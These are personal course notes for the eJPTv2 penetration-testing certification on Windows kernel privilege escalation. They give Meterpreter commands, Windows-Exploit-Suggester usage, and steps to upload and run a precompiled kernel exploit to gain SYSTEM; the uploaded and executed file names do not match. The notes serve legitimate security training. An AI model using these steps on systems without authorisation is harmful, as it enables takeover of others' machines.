---
up: "[[4. ARCHIVES/eJPTv2/Host & Network Penetration Testing/System - Host Based Attacks/Windows Privilege Escalation/Windows Privilege Escalation]]"
tools:
  - "[[Windows-Exploit-Suggester]]"
---

# Windows Kernel Exploits

## Privilege Escalation introduction

Privilege Escalation: process of exploiting vulnerabilities or misconfigurations in systems to elevate privileges from one user to another.

- PE is a vital element of the attack life cycle
- PE is done after gaining an initial foothold on a target system

## Windows Kernel

- Kernel is the core of an OS and has complete access of every resources and hardware
- It is the translation layer between hardware and software
- Windows NT is the kernel pre-packaged with all Windows versions
	- User mode: Programs and services running in user mode have limited access to system resources and functionality
	- Kernel mode: Unrestricted access to system resources and functionality

## Kernel Exploitation

- This process differs based on the version of Windows being targeted
- Typical methodology:
	- Identify kernel vulnerabilities
	- Downloading, compiling and transferring kernel exploits into the target system

## Tools & Environment

- Windows-Exploit-Suggester
	- Tool used to detect potential missing patches or usable metasploit modules
- Windows-Kernel-Exploits
	- Collection of Windows Kernel Exploits sorted by CVE

## Demonstration

### Using Metasploit

We already have a shell on the target machine.

```bash
$ getuid
$ getprivs
# auto try to PE
meterpreter > getsystem
```

```bash
# auto detect PE vectors
> use post/multi/recon/local_exploit_suggester
> set session <id>
```

### Manually

Using Windows-Exploit-Suggester:

1. First copy the output of the `systeminfo` command in a text file
2. Clone the tool repository

```bash
cd Windows-Exploit-Suggester
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database <db_file.xls> --systeminfo <sysinfo.txt>
```

Look at the list of suggestions.

Upload your exploit on the target machine:

```bash
> cd C:\\Temp
> upload 41045.exe
> shell
>.\41015.exe 7
>whoami
```
